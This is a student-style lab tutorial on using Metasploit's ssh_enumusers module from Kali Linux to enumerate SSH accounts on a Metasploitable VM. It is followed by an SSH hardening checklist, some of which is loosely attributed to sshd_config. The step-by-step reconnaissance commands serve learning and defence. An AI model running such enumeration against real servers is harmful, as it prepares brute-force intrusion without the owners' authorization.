## Kali Linux Metasploit SSH exploit

- [Kali Linux Metasploit SSH exploit](#kali-linux-metasploit-ssh-exploit)
    - [functionality](#functionality)
    - [starting the attack](#starting-the-attack)
    - [solving this exploit](#solving-this-exploit)
    - [Explaination of solutions](#explaination-of-solutions)
    - [Sources](#sources)

#### functionality

The ssh_enumusers attack on Metasploit sends a series of SSH-Messages to the target server in order to elicit a response from the SSH-Server that contains Information about the user accounts that preexist on the system of the target server. The responses are then analysed by the tool to enumerate user accounts. This attack can then be used to gain access to an account on the system, or to launch other attacks against the system, a good example for a follow up attack would be a bruteforce attack.

#### starting the attack

Using Kali Linux to attack the SSH-Service on Metasploit you firstly must use the metasploit framework such as `msfconsole`.
In this example I will attack the SSH-service on the Metaspoit Virtual Machine. This particular attack looks for potential user accounts that are in the system, which then can be used in further attacks.

As I previously stated above, The first thing you have to do is to use the metasploit framework.
For this there is a tool already installed. It's called msfconsole. You can access this tool with the following command.
``
┌──(kali㉿kali)-[~]
└─$ msfconsole
``


Now you may notice a change. That you are now connected with the frame work and where once your username stood now stand `msf6`. This is because as already stated due to you being connected with the framework.
Now let's start with an attack on the target server in our case that would be the Metasploit VM.
For our attack we want to see if there are any users on the target system and what user accounts there are. For this we must use `ssh_enumusers`. Now we must select the tool that is used for this sort of attack, this can be done by using the listed command down below.

``
msf6 > use auxiliary/scanner/ssh/ssh_enumusers 
``

After selecting the right Tool we can now continue. See if we would start the attack now we would end up no where so we have to **configure** our attack. This can be done with a simple command. This command would be the one stated below.

``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options
``

After typing in that command make sure that there is an Output. This Output contains the configuration of the attack. The Output should look like the following Output.
``````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   false            no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                            /wiki/Using-Metasploit
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing att
                                            ack only)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet

``````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````

As you can see the configuration of the attack looks pretty dry. This is because it's very likely that this is your first time setting up this kind of attack. However it is very easy to configure attacks. I will explain the module Options in my factsheet for my project you will find it here [ℹ️](../projectfactsheet.md#module-options-for-ssh_enumusers-attack)

Now the first thing you want to do is set the `RHOSTS` to the ip-address of your target system. As you can see in my documentation of how to install Kali or Metasploit. Look it up here [ℹ️](../MetasploitableInstallation.md#network-configs).
Setting the ip-address is very easy, just input the command below.
````
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 100.100.100.20
````

NOTE: Make sure that you do use the ip-address of the target system. 

After setting the ip-address of the target host system we now may adjust how many threads we want to create while our attack is running. Increasing this module option to say 25 threads will exponentially decrease our run time. This can be done with a simple command.

``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 25
``

NOTE: you can set the number of Threads to any number you want, just make sure that your system can actually support so many threads at a time.

And now we can bind our `USER_FILE` into our attack. This userfile comes preinstalled into Kali Linux when you opt to take the full installation of Kali Linux. you can bind this file with the following comamand
``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/namelist.txt
``

For our attack type we want to use a `Malformed Packets` attack, do this by typing in the following command. You can look up what this means in my project factsheet. [ℹ️](../projectfactsheet.md#auxiliary-actions-for-ssh_enumattack)
``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set action Malformed Packet
``

Now before we run this attack let us make a file that logs every output of the attack. This process is called making a spool file. Making this file willl allow us to see the results of the attack. This can be done with the following command
``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > spool /home/kali/console1.log
``

NOTE: Make sure that you open another linux terminal for this command

Running this attack can be done with the following command
``
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
``
#### solving this exploit

You can prevent the ssh_enumusers exploit by implementing following points. These several steps are crucial to ensure safety on your SSH-server. This can all be done in the config file of the SSH file. In order to do this go to the /etc directory and then to the following subdirectories, /ssh and then open the file ssh configuration file with following command.

``
sudo nano sshd_config
``

alternatively use the following command if youre still in the home directory

``
sudo nano /etc/ssh/sshd_config
``
``
1. Configure the SSH server to only allow a certain number of failed attempts before locking or disabling a user account.
2. Set up an intrusion detection system (IDS) to alert you when someone attempts to exploit the system.
3. Ensure that all user accounts have strong passwords.
4. Regularly change user passwords.
5. Enable two-factor authentication.
6. Disable root logins.
7. Set up a firewall to block suspicious IP addresses.
8. Monitor all SSH connections for suspicious activities.
9. Regularly patch and update the SSH server and its applications.
10. Limit access to the SSH server from trusted IP addresses
``

#### Explaination of solutions

1. Starting with the first solution. This solution prevents bruteforcing user accounts passwords. See bruteforcing function is a way of finding out Log-In credentials by trying different combinations of user account names and user account passwords. This is a very easy to deny, just change the config setting for failed login attempts before banning or suspending an ip-address.

2. This solution is very easy to explain as already kind of explained this solution alerts any intrusions that were recorded in your system. This is also especially useful against not only bruteforcing but also backdooring the targeted system. This solution can be enabled by either downloading a third-party software or changing the configuration in the config file.

3. Setting that users accounts can only be created when their passwords are strong enough will enusre that bruteforcing passwords will become near impossible. This, as every solution can be done in one of the config files.

4. Using this solution is very unlikely to prevent any breaches but it certainly helps with not having any instances. This can be done in one of the config files that manages user policies.

5. Enabling two-factor authentication or enforcing it, prevents bruteforcing and stealing user accounts.

6. Knowing what root-users can do is very critical, because knowing this you now know the biggest flaw in your system. Disabling remote login on to a root user is very critical because most if not often the root user holds a standardized password that can easily be bruteforced. Try setting root login only to local in order to prevent more serious damage.

7. Enabling this option to block any ip-adresses that were flagged for suspicious activities. Enabling this would be very effective against ssh_enumusers.

8. Monitoring activities on your ssh-service is very helpful because it can help you identify malicious activities and preemptively aborting or blocking that connection. Very helpful against backdoors.

9. Regularly patching and updating your ssh-service and also it's application that come with it, will significantly decrease the probability of successfull hacker attacks.

10. A more drastic meassure is to completlly limit the access to the server to only trusted ips. This means that only users that are in the same company or group as you, can access the ssh-server. This can be done in the sshd_config file.

#### Sources

[![](https://res.cloudinary.com/marcomontalbano/image/upload/v1676532226/video_to_markdown/images/youtube--40fGsQJ7AeI-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://www.youtube.com/watch?v=40fGsQJ7AeI "")


